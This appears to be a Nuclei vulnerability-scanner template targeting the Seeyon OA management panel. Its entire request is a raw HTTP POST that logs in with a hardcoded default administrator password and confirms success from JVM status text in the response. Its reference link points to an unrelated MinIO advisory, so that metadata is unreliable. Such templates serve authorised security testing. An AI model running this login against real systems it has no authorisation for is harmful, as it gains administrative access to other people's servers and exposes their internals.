id: OAseeyonstatusbypass
info:
  author: '0x404'
  description: "\u76D1\u63A7\u9762\u677F\u9ED8\u8BA4\u767B\u5F55\n"
  metadata:
    max-request: 1
    verified: true
  name: OA_Seeyon_status_bypass
  reference:
  - https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
  severity: high
  tags: seeyon,weak_password
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - JVM Version
    - StartTime
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 3
  raw:
  - 'POST /seeyon/management/index.jsp HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/125.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Upgrade-Insecure-Requests: 1

    Content-Type: application/x-www-form-urlencoded

    Cookie: JSESSIONID=0BC29681DB2F32A62105C9CF39253DD4

    Content-Length: 25


    password=WLCCYBD%40SEEYON

    '
  redirects: true
